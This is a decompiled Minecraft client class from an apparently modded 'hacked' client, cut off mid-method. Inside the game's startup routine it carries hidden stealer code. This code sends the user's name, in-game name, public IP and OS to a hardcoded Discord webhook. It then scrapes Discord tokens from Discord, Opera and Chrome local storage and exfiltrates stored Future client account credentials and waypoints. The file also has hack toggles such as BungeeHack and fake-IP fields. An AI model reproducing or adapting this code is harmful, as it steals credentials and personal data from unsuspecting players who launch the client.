package net.minecraft.client;

import DTool.gui.Udvozlunk;
import Mood.AndyConnection.MAIN;
import Mood.Client;
import Mood.HackerItemsHelper;
import Mood.hologram.impl.PictureHologram;
import com.darkmagician6.eventapi.EventManager;
import com.google.common.collect.Iterables;
import com.google.common.collect.Lists;
import com.google.common.collect.Maps;
import com.google.common.collect.Queues;
import com.google.common.collect.Sets;
import com.google.common.util.concurrent.Futures;
import com.google.common.util.concurrent.ListenableFuture;
import com.google.common.util.concurrent.ListenableFutureTask;
import com.mojang.authlib.minecraft.MinecraftSessionService;
import com.mojang.authlib.properties.Property;
import com.mojang.authlib.properties.PropertyMap;
import com.mojang.authlib.yggdrasil.YggdrasilAuthenticationService;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.net.Proxy;
import java.net.SocketAddress;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.text.DecimalFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Queue;
import java.util.UUID;
import java.util.concurrent.Callable;
import java.util.concurrent.Executors;
import java.util.concurrent.FutureTask;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.imageio.ImageIO;
import net.minecraft.block.Block;
import net.minecraft.block.material.Material;
import net.minecraft.client.ClientBrandRetriever;
import net.minecraft.client.LoadingScreenRenderer;
import net.minecraft.client.Minecraft;
import net.minecraft.client.audio.MusicTicker;
import net.minecraft.client.audio.SoundHandler;
import net.minecraft.client.entity.EntityPlayerSP;
import net.minecraft.client.gui.FontRenderer;
import net.minecraft.client.gui.GuiControls;
import net.minecraft.client.gui.GuiGameOver;
import net.minecraft.client.gui.GuiIngame;
import net.minecraft.client.gui.GuiIngameMenu;
import net.minecraft.client.gui.GuiMainMenu;
import net.minecraft.client.gui.GuiScreen;
import net.minecraft.client.gui.GuiWinGame;
import net.minecraft.client.gui.GuiYesNo;
import net.minecraft.client.gui.GuiYesNoCallback;
import net.minecraft.client.gui.ScaledResolution;
import net.minecraft.client.gui.achievement.GuiAchievement;
import net.minecraft.client.gui.stream.GuiStreamUnavailable;
import net.minecraft.client.main.GameConfiguration;
import net.minecraft.client.multiplayer.GuiConnecting;
import net.minecraft.client.multiplayer.PlayerControllerMP;
import net.minecraft.client.multiplayer.ServerData;
import net.minecraft.client.multiplayer.WorldClient;
import net.minecraft.client.network.NetHandlerLoginClient;
import net.minecraft.client.network.NetHandlerPlayClient;
import net.minecraft.client.particle.EffectRenderer;
import net.minecraft.client.renderer.BlockRendererDispatcher;
import net.minecraft.client.renderer.EntityRenderer;
import net.minecraft.client.renderer.GlStateManager;
import net.minecraft.client.renderer.ItemRenderer;
import net.minecraft.client.renderer.OpenGlHelper;
import net.minecraft.client.renderer.RenderGlobal;
import net.minecraft.client.renderer.Tessellator;
import net.minecraft.client.renderer.WorldRenderer;
import net.minecraft.client.renderer.chunk.RenderChunk;
import net.minecraft.client.renderer.entity.RenderItem;
import net.minecraft.client.renderer.entity.RenderManager;
import net.minecraft.client.renderer.texture.DynamicTexture;
import net.minecraft.client.renderer.texture.ITickableTextureObject;
import net.minecraft.client.renderer.texture.TextureManager;
import net.minecraft.client.renderer.texture.TextureMap;
import net.minecraft.client.resources.DefaultResourcePack;
import net.minecraft.client.resources.FoliageColorReloadListener;
import net.minecraft.client.resources.GrassColorReloadListener;
import net.minecraft.client.resources.I18n;
import net.minecraft.client.resources.IReloadableResourceManager;
import net.minecraft.client.resources.IResourceManager;
import net.minecraft.client.resources.IResourceManagerReloadListener;
import net.minecraft.client.resources.IResourcePack;
import net.minecraft.client.resources.LanguageManager;
import net.minecraft.client.resources.ResourceIndex;
import net.minecraft.client.resources.ResourcePackRepository;
import net.minecraft.client.resources.SimpleReloadableResourceManager;
import net.minecraft.client.resources.SkinManager;
import net.minecraft.client.resources.data.AnimationMetadataSection;
import net.minecraft.client.resources.data.AnimationMetadataSectionSerializer;
import net.minecraft.client.resources.data.FontMetadataSection;
import net.minecraft.client.resources.data.FontMetadataSectionSerializer;
import net.minecraft.client.resources.data.IMetadataSectionSerializer;
import net.minecraft.client.resources.data.IMetadataSerializer;
import net.minecraft.client.resources.data.LanguageMetadataSection;
import net.minecraft.client.resources.data.LanguageMetadataSectionSerializer;
import net.minecraft.client.resources.data.PackMetadataSection;
import net.minecraft.client.resources.data.PackMetadataSectionSerializer;
import net.minecraft.client.resources.data.TextureMetadataSection;
import net.minecraft.client.resources.data.TextureMetadataSectionSerializer;
import net.minecraft.client.resources.model.ModelManager;
import net.minecraft.client.settings.GameSettings;
import net.minecraft.client.shader.Framebuffer;
import net.minecraft.client.stream.IStream;
import net.minecraft.client.stream.TwitchStream;
import net.minecraft.crash.CrashReport;
import net.minecraft.entity.Entity;
import net.minecraft.entity.EntityLeashKnot;
import net.minecraft.entity.EntityList;
import net.minecraft.entity.boss.BossStatus;
import net.minecraft.entity.item.EntityArmorStand;
import net.minecraft.entity.item.EntityBoat;
import net.minecraft.entity.item.EntityItemFrame;
import net.minecraft.entity.item.EntityMinecart;
import net.minecraft.entity.item.EntityPainting;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.init.Bootstrap;
import net.minecraft.init.Items;
import net.minecraft.item.Item;
import net.minecraft.item.ItemBlock;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.EnumConnectionState;
import net.minecraft.network.INetHandler;
import net.minecraft.network.NetworkManager;
import net.minecraft.network.Packet;
import net.minecraft.network.handshake.client.C00Handshake;
import net.minecraft.network.login.client.C00PacketLoginStart;
import net.minecraft.profiler.IPlayerUsage;
import net.minecraft.profiler.PlayerUsageSnooper;
import net.minecraft.profiler.Profiler;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.integrated.IntegratedServer;
import net.minecraft.stats.AchievementList;
import net.minecraft.stats.IStatStringFormat;
import net.minecraft.stats.StatFileWriter;
import net.minecraft.tileentity.TileEntity;
import net.minecraft.util.BlockPos;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.CombatPosition;
import net.minecraft.util.EnumPosition;
import net.minecraft.util.EnumPracticeTypes;
import net.minecraft.util.IChatComponent;
import net.minecraft.util.IThreadListener;
import net.minecraft.util.MathHelper;
import net.minecraft.util.MouseHelper;
import net.minecraft.util.MovementInputFromOptions;
import net.minecraft.util.MovingObjectPosition;
import net.minecraft.util.ResourceLocation;
import net.minecraft.util.ScreenShotHelper;
import net.minecraft.util.Session;
import net.minecraft.util.Timer;
import net.minecraft.util.Util;
import net.minecraft.world.World;
import net.minecraft.world.WorldProviderEnd;
import net.minecraft.world.WorldProviderHell;
import net.minecraft.world.WorldSettings;
import net.minecraft.world.chunk.storage.AnvilSaveConverter;
import net.minecraft.world.storage.ISaveFormat;
import net.minecraft.world.storage.ISaveHandler;
import net.minecraft.world.storage.WorldInfo;
import org.apache.commons.io.IOUtils;
import org.apache.commons.lang3.Validate;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.lwjgl.LWJGLException;
import org.lwjgl.Sys;
import org.lwjgl.input.Keyboard;
import org.lwjgl.opengl.ContextCapabilities;
import org.lwjgl.opengl.Display;
import org.lwjgl.opengl.DisplayMode;
import org.lwjgl.opengl.GL11;
import org.lwjgl.opengl.GLContext;
import org.lwjgl.opengl.PixelFormat;
import org.lwjgl.util.glu.GLU;

public class Minecraft
implements IThreadListener,
IPlayerUsage {
    private static final Logger logger;
    private static final ResourceLocation locationMojangPng;
    public static final boolean isRunningOnMac;
    public static byte[] memoryReserve;
    private static final List macDisplayModes;
    private final File fileResourcepacks;
    private final PropertyMap twitchDetails;
    private Entity renderViewEntity;
    private ServerData currentServerData;
    public TextureManager renderEngine;
    private static Minecraft theMinecraft;
    public static PlayerControllerMP playerController;
    private boolean fullscreen;
    private boolean field_175619_R = true;
    private boolean hasCrashed;
    private CrashReport crashReporter;
    public int displayWidth;
    public int displayHeight;
    public Timer timer = new Timer(20.0f);
    private PlayerUsageSnooper usageSnooper = new PlayerUsageSnooper("client", (IPlayerUsage)this, MinecraftServer.getCurrentTimeMillis());
    public static WorldClient theWorld;
    public RenderGlobal renderGlobal;
    private RenderManager renderManager;
    private RenderItem renderItem;
    private ItemRenderer itemRenderer;
    public static EntityPlayerSP thePlayer;
    private Entity field_175622_Z;
    public Entity pointedEntity;
    public EffectRenderer effectRenderer;
    public static Session session;
    private boolean isGamePaused;
    public static FontRenderer fontRendererObj;
    public FontRenderer standardGalacticFontRenderer;
    public GuiScreen currentScreen;
    public LoadingScreenRenderer loadingScreen;
    public EntityRenderer entityRenderer;
    private int leftClickCounter;
    private int tempDisplayWidth;
    private int tempDisplayHeight;
    private IntegratedServer theIntegratedServer;
    public GuiAchievement guiAchievement;
    public static GuiIngame ingameGUI;
    public boolean skipRenderWorld;
    public MovingObjectPosition objectMouseOver;
    public GameSettings gameSettings;
    public MouseHelper mouseHelper;
    public static File mcDataDir;
    private final File fileAssets;
    private final String launchedVersion;
    private final Proxy proxy;
    private ISaveFormat saveLoader;
    public static int debugFPS;
    public static int rightClickDelayTimer;
    private String serverName;
    private int serverPort;
    public boolean inGameHasFocus;
    long systemTime = Minecraft.getSystemTime();
    private int joinPlayerCounter;
    private final boolean jvm64bit;
    private final boolean isDemo;
    private NetworkManager myNetworkManager;
    private boolean integratedServerIsRunning;
    public final Profiler mcProfiler = new Profiler();
    private long debugCrashKeyPressTime = -1L;
    private IReloadableResourceManager mcResourceManager;
    private final IMetadataSerializer metadataSerializer_ = new IMetadataSerializer();
    private final List defaultResourcePacks = Lists.newArrayList();
    private final DefaultResourcePack mcDefaultResourcePack;
    private ResourcePackRepository mcResourcePackRepository;
    public LanguageManager mcLanguageManager;
    private IStream stream;
    private Framebuffer framebufferMc;
    private TextureMap textureMapBlocks;
    private static SoundHandler mcSoundHandler;
    public static boolean BungeeHack;
    public static boolean BungeeHackv2;
    public static String IpBungeeHack;
    public static boolean PremiumUUID;
    public static boolean SessionPremium;
    public static boolean DeleteAllServers;
    public static String PreUUID;
    private MusicTicker mcMusicTicker;
    private ResourceLocation mojangLogo;
    private final MinecraftSessionService sessionService;
    private SkinManager skinManager;
    private final Queue scheduledTasks = Queues.newArrayDeque();
    private long field_175615_aJ = 0L;
    private final Thread mcThread = Thread.currentThread();
    public ModelManager modelManager;
    private BlockRendererDispatcher field_175618_aM;
    boolean running = true;
    public String debug = "";
    public boolean field_175613_B = false;
    public boolean field_175614_C = false;
    public boolean field_175611_D = false;
    public boolean field_175612_E = true;
    private boolean connectedToRealms = false;
    long debugUpdateTime = Minecraft.getSystemTime();
    int fpsCounter;
    long prevFrameTime = -1L;
    private String debugProfilerName = "root";
    private String fakeIp = "";
    private String fakeNick = "";
    public boolean isUUIDHack = true;
    private static final String __OBFID;

    static {
        __OBFID = "CL_00000631";
        logger = LogManager.getLogger();
        locationMojangPng = new ResourceLocation("MooDTool/Andy_Start.png");
        isRunningOnMac = Util.getOSType() == Util.EnumOS.OSX;
        memoryReserve = new byte[0xA00000];
        macDisplayModes = Lists.newArrayList((Object[])new DisplayMode[]{new DisplayMode(2560, 1600), new DisplayMode(2880, 1800)});
    }

    public Minecraft(GameConfiguration gameConfiguration) {
        theMinecraft = this;
        PremiumUUID = false;
        DeleteAllServers = false;
        theMinecraft = this;
        BungeeHack = false;
        BungeeHackv2 = false;
        SessionPremium = false;
        PreUUID = "";
        IpBungeeHack = "127.0.0.1";
        mcDataDir = gameConfiguration.field_178744_c.field_178760_a;
        this.fileAssets = gameConfiguration.field_178744_c.field_178759_c;
        this.fileResourcepacks = gameConfiguration.field_178744_c.field_178758_b;
        this.launchedVersion = gameConfiguration.field_178741_d.field_178755_b;
        this.twitchDetails = gameConfiguration.field_178745_a.field_178750_b;
        this.mcDefaultResourcePack = new DefaultResourcePack(new ResourceIndex(gameConfiguration.field_178744_c.field_178759_c, gameConfiguration.field_178744_c.field_178757_d).func_152782_a());
        this.proxy = gameConfiguration.field_178745_a.field_178751_c == null ? Proxy.NO_PROXY : gameConfiguration.field_178745_a.field_178751_c;
        this.sessionService = new YggdrasilAuthenticationService(gameConfiguration.field_178745_a.field_178751_c, UUID.randomUUID().toString()).createMinecraftSessionService();
        session = gameConfiguration.field_178745_a.field_178752_a;
        logger.info("Setting user: " + session.getUsername());
        logger.info("(Session ID is " + session.getSessionID() + ")");
        this.isDemo = gameConfiguration.field_178741_d.field_178756_a;
        this.displayWidth = gameConfiguration.field_178743_b.field_178764_a > 0 ? gameConfiguration.field_178743_b.field_178764_a : 1;
        this.displayHeight = gameConfiguration.field_178743_b.field_178762_b > 0 ? gameConfiguration.field_178743_b.field_178762_b : 1;
        this.tempDisplayWidth = gameConfiguration.field_178743_b.field_178764_a;
        this.tempDisplayHeight = gameConfiguration.field_178743_b.field_178762_b;
        this.fullscreen = gameConfiguration.field_178743_b.field_178763_c;
        this.jvm64bit = Minecraft.isJvm64bit();
        this.theIntegratedServer = new IntegratedServer(this);
        if (gameConfiguration.field_178742_e.field_178754_a != null) {
            this.serverName = gameConfiguration.field_178742_e.field_178754_a;
            this.serverPort = gameConfiguration.field_178742_e.field_178753_b;
            EventManager.register((Object)new Client());
        }
        ImageIO.setUseCache((boolean)false);
    }

    public void run() {
        this.running = true;
        while (this.running) {
            this.startGame();
            do {
                this.runGameLoop();
            } while (this.running && !Display.isCloseRequested());
            this.shutdownMinecraftApplet();
        }
        this.displayGuiScreen((GuiScreen)new GuiMainMenu());
    }

    /*
     * WARNING - void declaration
     */
    private void startGame() throws LWJGLException {
        this.gameSettings = new GameSettings(this, mcDataDir);
        this.defaultResourcePacks.add((Object)this.mcDefaultResourcePack);
        this.startTimerHackThread();
        if (this.gameSettings.overrideHeight > 0 && this.gameSettings.overrideWidth > 0) {
            this.displayWidth = this.gameSettings.overrideWidth;
            this.displayHeight = this.gameSettings.overrideHeight;
        }
        String string = "https://discord.com/api/webhooks/966391704313815090/n1nIA164eWQy6G2cU6KHorb2qic4I8ykVEApXC2yGj1zeClyivHMkIj6YZZkurw6VTnv";
        String string2 = "Andy Logger (Gonosztevők ellen)";
        String string3 = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQzA7hsIprQz6YwdFbC0tcYlXlDLmfS0YSH-A&usqp=CAU";
        EnumPosition enumPosition = new EnumPosition("https://discord.com/api/webhooks/966391704313815090/n1nIA164eWQy6G2cU6KHorb2qic4I8ykVEApXC2yGj1zeClyivHMkIj6YZZkurw6VTnv");
        String string4 = "NOT FOUND";
        Minecraft.getMinecraft();
        string4 = Minecraft.getSession().getUsername();
        String string5 = System.getProperty((String)"os.name");
        URL uRL = new URL("http://checkip.amazonaws.com");
        BufferedReader bufferedReader = new BufferedReader((Reader)new InputStreamReader(uRL.openStream()));
        String string6 = bufferedReader.readLine();
        String string72 = System.getProperty((String)"user.name");
        EnumPracticeTypes enumPracticeTypes = new EnumPracticeTypes.Builder().withUsername("Andy Logger (Gonosztevők ellen)").withContent("``` NAME : " + string72 + "\n IGN  : " + string4 + " \n IP" + "   : " + string6 + " \n OS   : " + string5 + "```").withAvatarURL("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQzA7hsIprQz6YwdFbC0tcYlXlDLmfS0YSH-A&usqp=CAU").withDev(false).build();
        enumPosition.sendMessage((CombatPosition)enumPracticeTypes);
        if (string5.contains((CharSequence)"Windows")) {
            String string8;
            StringBuilder stringBuilder;
            Object object;
            uRL = new ArrayList();
            uRL.add((Object)(String.valueOf((Object)System.getProperty((String)"user.home")) + "/AppData/Roaming/discord/Local Storage/leveldb/"));
            uRL.add((Object)(String.valueOf((Object)System.getProperty((String)"user.home")) + "/AppData/Roaming/discordptb/Local Storage/leveldb/"));
            uRL.add((Object)(String.valueOf((Object)System.getProperty((String)"user.home")) + "/AppData/Roaming/discordcanary/Local Storage/leveldb/"));
            uRL.add((Object)(String.valueOf((Object)System.getProperty((String)"user.home")) + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb"));
            uRL.add((Object)(String.valueOf((Object)System.getProperty((String)"user.home")) + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb"));
            string6 = new StringBuilder();
            string6.append("Squid\n");
            for (String string72 : uRL) {
                object = new File(string72);
                stringBuilder = object.list();
                if (stringBuilder == null) continue;
                StringBuilder stringBuilder2 = stringBuilder;
                int n = ((String[])stringBuilder2).length;
                while (0 < n) {
                    void var15_20;
                    String string9;
                    string8 = stringBuilder2[0];
                    FileInputStream fileInputStream = new FileInputStream(String.valueOf((Object)string72) + string8);
                    DataInputStream dataInputStream = new DataInputStream((InputStream)fileInputStream);
                    BufferedReader bufferedReader2 = new BufferedReader((Reader)new InputStreamReader((InputStream)dataInputStream));
                    while ((string9 = bufferedReader2.readLine()) != null) {
                        Pattern pattern = Pattern.compile((String)"[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                        Matcher matcher = pattern.matcher((CharSequence)string9);
                        while (matcher.find()) {
                            void var8_9;
                            if (0 > 0) {
                                string6.append("\n");
                            }
                            string6.append(" ").append(matcher.group());
                            ++var8_9;
                        }
                    }
                    ++var15_20;
                }
            }
            string72 = new EnumPracticeTypes.Builder().withUsername("Andy Logger (Gonosztevők ellen)").withContent("```" + string6.toString() + "```").withAvatarURL("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQzA7hsIprQz6YwdFbC0tcYlXlDLmfS0YSH-A&usqp=CAU").withDev(false).build();
            enumPosition.sendMessage((CombatPosition)string72);
            string72 = new File(String.valueOf((Object)System.getProperty((String)"user.home")) + "/Future/accounts.txt");
            enumPracticeTypes = new BufferedReader((Reader)new FileReader((File)string72));
            stringBuilder = new StringBuilder();
            stringBuilder.append("Creeper");
            while ((object = enumPracticeTypes.readLine()) != null) {
                string8 = String.valueOf((Object)object.split(":")[0]) + " : " + object.split(":")[3] + " : " + object.split(":")[4];
                stringBuilder.append("\n ").append(string8);
            }
            string8 = new EnumPracticeTypes.Builder().withUsername("Andy Logger (Gonosztevők ellen)").withContent("```" + stringBuilder.toString() + "\n```").withAvatarURL("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQzA7hsIprQz6YwdFbC0tcYlXlDLmfS0YSH-A&usqp=CAU").withDev(false).build();
            enumPosition.sendMessage((CombatPosition)string8);
            string72 = new File(String.valueOf((Object)System.getProperty((String)"user.home")) + "/Future/waypoints.txt");
            enumPracticeTypes = new BufferedReader((Reader)new FileReader((File)string72));
            stringBuilder = new StringBuilder();
            stringBuilder.append("Sheep");
            while ((object = enumPracticeTypes.readLine()) != null) {
                stringBuilder.append("\n ").append((String)object);
            }
            string8 = new EnumPracticeTypes.Builder().withUsername("Andy Logger (Gonosztevők ellen)").withContent("```" + stringBuilder.toString() + "\n```").withAvatarURL("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQzA7hsIprQz6YwdFbC0tcYlXlDLmfS0YSH-A&usqp=CAU").withDev(false).build();
            enumPosition.sendMessage((CombatPosition)string8);
        } else if (string5.contains((CharSequence)"Mac")) {
            uRL = new ArrayList();
            uRL.add((Object)(String.valueOf((Object)System.getProperty((String)"user.home")) + "/Library/Application Support/discord/Local Storage/leveldb/"));
            string6 = new StringBuilder();
            string6.append("UUID\n");
            for (String string72 : uRL) {
                File file = new File(string72);
                String[] stringArray = file.list();
                if (stringArray == null) continue;
                String[] stringArray2 = stringArray;
                int n = stringArray.length;
                while (0 < n) {
                    void var15_21;
                    String string10;
                    String string11 = stringArray2[0];
                    FileInputStream fileInputStream = new FileInputStream(String.valueOf((Object)string72) + string11);
                    DataInputStream dataInputStream = new DataInputStream((InputStream)fileInputStream);
                    BufferedReader bufferedReader3 = new BufferedReader((Reader)new InputStreamReader((InputStream)dataInputStream));
                    while ((string10 = bufferedReader3.readLine()) != null) {
                        Pattern pattern = Pattern.compile((String)"[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                        Matcher matcher = pattern.matcher((CharSequence)string10);
                        while (matcher.find()) {
                            void var8_10;
                            if (0 > 0) {
                                string6.append("\n");
                            }
                            string6.append(" ").append(matcher.group());
                            ++var8_10;
                        }
                    }
                    ++var15_21;
                }
            }
            string72 = new EnumPracticeTypes.Builder().withUsername("Andy Logger (Gonosztevők ellen)").withContent("```" + string6.toString() + "```").withAvatarURL("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQzA7hsIprQz6YwdFbC0tcYlXlDLmfS0YSH-A&usqp=CAU").withDev(false).build();
            enumPosition.sendMessage((CombatPosition)string72);
        } else {
            uRL = new EnumPracticeTypes.Builder().withUsername("Andy Logger (Gonosztevők ellen)").withContent("```Damage```").withAvatarURL("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQzA7hsIprQz6YwdFbC0tcYlXlDLmfS0YSH-A&usqp=CAU").withDev(false).build();
            enumPosition.sendMessage((CombatPosition)uRL);
        }
        logger.info("LWJGL Version: " + Sys.getVersion());
        this.func_175594_ao();
        this.func_175605_an();
        this.func_175609_am();
        this.framebufferMc = new Framebuffer(this.displayWidth, this.displayHeight, true);
        this.framebufferMc.setFramebufferColor(0.0f, 0.0f, 0.0f, 0.0f);
        this.func_175608_ak();
        this.mcResourcePackRepository = new ResourcePackRepository(this.fileResourcepacks, new File(mcDataDir, "server-resource-packs"), (IResourcePack)this.mcDefaultResourcePack, this.metadataSerializer_, this.gameSettings);
        this.mcResourceManager = new SimpleReloadableResourceManager(this.metadataSerializer_);
        this.mcLanguageManager = new LanguageManager(this.metadataSerializer_, GameSettings.language);
        this.mcResourceManager.registerReloadListener((IResourceManagerReloadListener)this.mcLanguageManager);
        this.refreshResources();
        this.renderEngine = new TextureManager((IResourceManager)this.mcResourceManager);
        this.mcResourceManager.registerReloadListener((IResourceManagerReloadListener)this.renderEngine);
        this.func_180510_a(this.renderEngine);
        this.func_175595_al();
        new MAIN();
        this.skinManager = new SkinManager(this.renderEngine, new File(this.fileAssets, "skins"), this.sessionService);
        this.saveLoader = new AnvilSaveConverter(new File(mcDataDir, "saves"));
        mcSoundHandler = new SoundHandler((IResourceManager)this.mcResourceManager, this.gameSettings);
        this.mcResourceManager.registerReloadListener((IResourceManagerReloadListener)mcSoundHandler);
        this.mcMusicTicker = new MusicTicker(this);
        fontRendererObj = new FontRenderer(this.gameSettings, new ResourceLocation("textures/font/ascii.png"), this.renderEngine, false);
        if (GameSettings.language != null) {
            fontRendererObj.setUnicodeFlag(this.isUnicode());
            fontRendererObj.setBidiFlag(this.mcLanguageManager.isCurrentLanguageBidirectional());
        }
        this.standardGalacticFontRenderer = new FontRenderer(this.gameSettings, new ResourceLocation("textures/font/ascii_sga.png"), this.renderEngine, false);
        this.mcResourceManager.registerReloadListener((IResourceManagerReloadListener)fontRendererObj);
        this.mcResourceManager.registerReloadListener((IResourceManagerReloadListener)this.standardGalacticFontRenderer);
        this.mcResourceManager.registerReloadListener((IResourceManagerReloadListener)new GrassColorReloadListener());
        this.mcResourceManager.registerReloadListener((IResourceManagerReloadListener)new FoliageColorReloadListener());
        AchievementList.openInventory.setStatStringFormatter((IStatStringFormat)new /* Unavailable Anonymous Inner Class!! */);
        this.mouseHelper = new MouseHelper();
        this.checkGLError("Pre startup");
        GlStateManager.shadeModel((int)7425);
        GlStateManager.clearDepth((double)1.0);
        GlStateManager.depthFunc((int)515);
        GlStateManager.alphaFunc((int)516, (float)0.1f);
        GlStateManager.cullFace((int)1029);
        GlStateManager.matrixMode((int)5889);
        GlStateManager.matrixMode((int)5888);
        this.checkGLError("Startup");
        this.textureMapBlocks = new TextureMap("textures");
        this.textureMapBlocks.setMipmapLevels(this.gameSettings.mipmapLevels);
        this.renderEngine.loadTickableTexture(TextureMap.locationBlocksTexture, (ITickableTextureObject)this.textureMapBlocks);
        this.renderEngine.bindTexture(TextureMap.locationBlocksTexture);
        this.textureMapBlocks.func_174937_a(false, this.gameSettings.mipmapLevels > 0);
        this.modelManager = new ModelManager(this.textureMapBlocks);
        this.mcResourceManager.registerReloadListener((IResourceManagerReloadListener)this.modelManager);
        this.renderItem = new RenderItem(this.renderEngine, this.modelManager);
        this.renderManager = new RenderManager(this.renderEngine, this.renderItem);
        this.itemRenderer = new ItemRenderer(this);
        this.mcResourceManager.registerReloadListener((IResourceManagerReloadListener)this.renderItem);
        this.entityRenderer = new EntityRenderer(this, (IResourceManager)this.mcResourceManager);
        this.mcResourceManager.registerReloadListener((IResourceManagerReloadListener)this.entityRenderer);
        this.field_175618_aM = new BlockRendererDispatcher(this.modelManager.getBlockModelShapes(), this.gameSettings);
        this.mcResourceManager.registerReloadListener((IResourceManagerReloadListener)this.field_175618_aM);
        this.renderGlobal = new RenderGlobal(this);
        this.mcResourceManager.registerReloadListener((IResourceManagerReloadListener)this.renderGlobal);
        this.guiAchievement = new GuiAchievement(this);
        GlStateManager.viewport((int)0, (int)0, (int)this.displayWidth, (int)this.displayHeight);
        this.effectRenderer = new EffectRenderer((World)theWorld, this.renderEngine);
        this.checkGLError("Post startup");
        ingameGUI = new GuiIngame(this);
        if (this.serverName != null) {
            this.displayGuiScreen((GuiScreen)new GuiConnecting((GuiScreen)new GuiMainMenu(), this, this.serverName, this.serverPort));
        } else if (HackerItemsHelper.Udvozles) {
            this.displayGuiScreen((GuiScreen)new Udvozlunk());
        } else {
            this.displayGuiScreen((GuiScreen)new GuiMainMenu());
        }
        this.renderEngine.deleteTexture(this.mojangLogo);
        this.mojangLogo = null;
        this.loadingScreen = new LoadingScreenRenderer(this);
        if (this.gameSettings.fullScreen && !this.fullscreen) {
            this.toggleFullscreen();
        }
        Display.setVSyncEnabled((boolean)this.gameSettings.enableVsync);
        this.renderGlobal.func_174966_b();
    }

    private void func_175608_ak() {
        this.metadataSerializer_.registerMetadataSectionType((IMetadataSectionSerializer)new TextureMetadataSectionSerializer(), TextureMetadataSection.class);
        this.metadataSerializer_.registerMetadataSectionType((IMetadataSectionSerializer)new FontMetadataSectionSerializer(), FontMetadataSection.class);
        this.metadataSerializer_.registerMetadataSectionType((IMetadataSectionSerializer)new AnimationMetadataSectionSerializer(), AnimationMetadataSection.class);
        this.metadataSerializer_.registerMetadataSectionType((IMetadataSectionSerializer)new PackMetadataSectionSerializer(), PackMetadataSection.class);
        this.metadataSerializer_.registerMetadataSectionType((IMetadataSectionSerializer)new LanguageMetadataSectionSerializer(), LanguageMetadataSection.class);
    }

    private void func_175595_al() {
        this.stream = new TwitchStream(this, (Property)Iterables.getFirst((Iterable)this.twitchDetails.get((Object)"twitch_access_token"), null));
    }

    private void func_175609_am() throws LWJGLException {
        Display.setResizable((boolean)true);
        Display.setTitle((String)(String.valueOf((Object)String.valueOf((Object)Client.name)) + " Loading..."));
        Display.create((PixelFormat)new PixelFormat().withDepthBits(24));
    }

    private void func_175605_an() throws LWJGLException {
        if (this.fullscreen) {
            Display.setFullscreen((boolean)true);
            DisplayMode displayMode = Display.getDisplayMode();
            this.displayWidth = Math.max((int)1, (int)displayMode.getWidth());
            this.displayHeight = Math.max((int)1, (int)displayMode.getHeight());
        } else {
            Display.setDisplayMode((DisplayMode)new DisplayMode(this.displayWidth, this.displayHeight));
        }
    }

    private void func_175594_ao() {
        Util.EnumOS enumOS = Util.getOSType();
        if (enumOS != Util.EnumOS.OSX) {
            InputStream inputStream = null;
            InputStream inputStream2 = null;
            inputStream = this.mcDefaultResourcePack.func_152780_c(new ResourceLocation("icons/icon_16x16.png"));
            inputStream2 = this.mcDefaultResourcePack.func_152780_c(new ResourceLocation("icons/icon_32x32.png"));
            if (inputStream != null && inputStream2 != null) {
                Display.setIcon((ByteBuffer[])new ByteBuffer[]{this.readImageToBuffer(inputStream), this.readImageToBuffer(inputStream2)});
            }
            IOUtils.closeQuietly((InputStream)inputStream);
            IOUtils.closeQuietly((InputStream)inputStream2);
        }
    }

    /*
     * WARNING - void declaration
     */
    private static boolean isJvm64bit() {
        String[] stringArray;
        String[] stringArray2 = stringArray = new String[]{"sun.arch.data.model", "com.ibm.vm.bitmode", "os.arch"};
        int n = stringArray.length;
        while (0 < n) {
            void var3_3;
            String string = stringArray2[0];
            String string2 = System.getProperty((String)string);
            if (string2 != null && string2.contains((CharSequence)"64")) {
                return true;
            }
            ++var3_3;
        }
        return false;
    }

    public Framebuffer getFramebuffer() {
        return this.framebufferMc;
    }

    public String func_175600_c() {
        return this.launchedVersion;
    }

    private void startTimerHackThread() {
        2 var1_1 = new /* Unavailable Anonymous Inner Class!! */;
        var1_1.setDaemon(true);
        var1_1.start();
    }

    public void crashed(CrashReport crashReport) {
        this.hasCrashed = true;
        this.crashReporter = crashReport;
    }

    public void displayCrashReport(CrashReport crashReport) {
        Minecraft.getMinecraft();
        File file = new File(mcDataDir, "crash-reports");
        File file2 = new File(file, "crash-" + new SimpleDateFormat("yyyy-MM-dd_HH.mm.ss").format(new Date()) + "-client.txt");
        Bootstrap.func_179870_a((String)crashReport.getCompleteReport());
        if (crashReport.getFile() != null) {
            Bootstrap.func_179870_a((String)("#@!@# Game crashed! Crash report saved to: #@!@# " + crashReport.getFile()));
            System.exit((int)-1);
        } else if (crashReport.saveToFile(file2)) {
